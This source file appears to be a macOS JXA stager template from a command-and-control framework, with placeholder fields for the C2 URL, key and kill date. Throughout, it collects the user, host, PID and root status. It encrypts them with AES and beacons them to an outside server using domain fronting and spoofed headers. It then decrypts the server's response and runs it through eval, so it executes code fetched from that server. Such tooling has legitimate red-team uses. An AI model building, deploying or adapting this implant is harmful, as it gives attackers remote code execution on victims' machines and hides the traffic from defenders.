ObjC.import('Cocoa');
ObjC.import('Foundation');
ObjC.import('stdlib');
ObjC.import('Security');
ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

// Global Vars:
//#REPLACEINSECURE#
var df = [#REPLACEDOMAINFRONT#];
var h = "";
var sc = "";
var urls = [#REPLACEIMPTYPE#];
var curl = "#REPLACECONNECTURL#";
var s = urls[0]

// Implant Information (Used to show what user, hostname, IP, etc)
class agent{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
        this.procName = $.NSProcessInfo.processName;
		this.hostInfo = $.NSHost.currentHost;
		this.cu = ObjC.deepUnwrap(this.procInfo.userName);
		this.pid = this.procInfo.processIdentifier;
		this.host = ObjC.deepUnwrap(this.hostInfo.names)[0];
		}
}
var posh_implant = new agent();

// partly based on Apfel https://github.com/its-a-feature/Mythic
function enc(data){
    // takes in the string we're about to send, encrypts it, and returns a new string
    let err = Ref();
    let encrypt = $.SecEncryptTransformCreate(cryptokey,err);
    let b = $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
    b= $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
    //generate a random IV to use
    let IV = $.NSMutableData.dataWithLength(16);
    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
    b = $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
    //$.CFShow(IV);
    // set our data to be encrypted
    let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
    b=$.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
    let encryptedData = $.SecTransformExecute(encrypt, err);
    //$.CFShow(encryptedData);
    // now we need to prepend the IV to the encrypted data before we base64 encode and return it
    let length = encryptedData.length;
    let remainder = length % 16;
    if ( remainder != 0 ) {
      for (i=0; i < (16 - remainder); i++) {
          encryptedData.push("\x00");
        }
    }
    length = encryptedData.length;
    let final_message = $.NSMutableData.dataWithLength(0);
    final_message.appendData(IV);
    final_message.appendData(encryptedData);
    //console.log(final_message.base64EncodedStringWithOptions(0).js);
    return final_message.base64EncodedStringWithOptions(0).js;
}

function dec(nsdata){
    //takes in a base64 encoded string to be decrypted and returned
    let err = Ref();
    let decrypt = $.SecDecryptTransformCreate(cryptokey, err);
    $.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
    $.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
    // The first 16 bytes are the IV and the rest is the message to decrypt
    let iv_range = $.NSMakeRange(0, 16);
    let message_range = $.NSMakeRange(16, nsdata.length - 16);
    let iv = nsdata.subdataWithRange(iv_range);
    //$.CFShow(iv);
    $.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, err);
    let message = nsdata.subdataWithRange(message_range);
    //$.CFShow(message);
    $.SecTransformSetAttribute(decrypt, $("INPUT"), message, err);
    let decryptedData = $.SecTransformExecute(decrypt, Ref());
    let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
    return decrypted_message;
}

function decode(data) {
    // base64 decoding
	if(typeof data == "string"){
			var ns_data = $.NSData.alloc.initWithBase64Encoding($(data));
	}
	else{
			var ns_data = data;
	}
	var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
	return decoded_data;
}

function encode(data) {
    //base64 encoding
	if(typeof data == "string"){
			var ns_data = convert_to_nsdata(data);
	}
	else{
			var ns_data = data;
	}
	var encstring = ns_data.base64EncodedStringWithOptions(0).js;
	return encstring;
}

convert_to_nsdata = function(strData){
    // helper function to convert UTF8 strings to NSData objects
    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
    return tmpString.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
};

function primers() {
    for (url of urls) {
        //console.log(url);
        try {
            primern(url);
        } catch(error) {
            console.log(error);
        }
    }
}

function primern(url) {
    s = url + curl;
    sc = url;
    h = df;
    let el = "";
    // if user is root, mark with a *
    if (posh_implant.cu === "root") {
        el = "*";
    } else {
        el = "";
    }
    let o = posh_implant.cu + el + ';' + posh_implant.host + ';' + posh_implant.pid + posh_implant.procName +';#REPLACEURLID#';
    // Encrypt o and set as cookie
    let cookie = enc(o);
    primern = get_webclient(cookie);
    //let p = $.CFShow(primern);
    let p = $.NSData.alloc.initWithBase64Encoding(primern);
    var ns_data = convert_to_nsdata(p);
    if(typeof p == "string"){
            var ns_data = convert_to_nsdata(p);
    }
    else{
            var ns_data = p;
    }
    try {
        // decrypt response
        p = dec(ns_data);
        //decode decrypted data
        p = decode(p.js);
        //console.log(p);
        // if *key* in response, then run eval 
        if ( p.includes("key") ) {
            ObjC.deepUnwrap(eval(p));
        }
    }
    catch {}
}

function get_webclient(cookie) {
    // get current date and time
    let month = ("0" + (currentApp.currentDate().getMonth() + 1)).slice(-2);
    let day = ("0" + currentApp.currentDate().getDate()).slice(-2);
    let year = currentApp.currentDate().getFullYear();
    let d = year + "-" + month + "-" + day;
    //kill date.
    let k = "#REPLACEKILLDATE#";
    if (k < d) {
        $.exit(0);
    }
    // proxy information from config (Do i need proxy information on a mac?)
    let username = "#REPLACEPROXYUSER#"; //Set from config
    let password = "#REPLACEPROXYPASS#"; //set from config
    let proxyurl = "#REPLACEPROXYURL#"; //set from config
    // Setup web request
    let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(s));
    // Cookies
    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String("SessionID="+cookie), $.NSString.alloc.initWithUTF8String("Cookie"));
    // Other Headers
    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String("#REPLACEREFERER#"), $.NSString.alloc.initWithUTF8String("Referer"));
    if (h != ""){
        req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(h), $.NSString.alloc.initWithUTF8String("Host"));
    }
    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String("#REPLACEUSERAGENT#"), $.NSString.alloc.initWithUTF8String("User-Agent"));
    // Initial Request is a GET
    req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
    //$.CFShow(req.allHTTPHeaderFields);
    let response = Ref();
    let error = Ref();
    let responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
    //$.CFShow(responseData);
    return responseData;
}

var aes_psk = "#REPLACEKEY#"; //get from payload generation
var parameters = $({"type": $.kSecAttrKeyTypeAES});
var raw_key = $.NSData.alloc.initWithBase64Encoding(aes_psk);
var cryptokey = $.SecKeyCreateFromData(parameters, raw_key, Ref());

let limit = #REPLACESTAGERRETRIESLIMIT#;
while (true) {
    let wait = #REPLACESTAGERRETRIESWAIT#; // used to try 30 times, starting with a 5 second wait, doubling each time until dying.
    if (limit > 0) {
        limit = limit - 1;
        primers();
        $.NSThread.sleepForTimeInterval(wait);
        wait = wait * 2;
    } else {
        primers();
    }
}
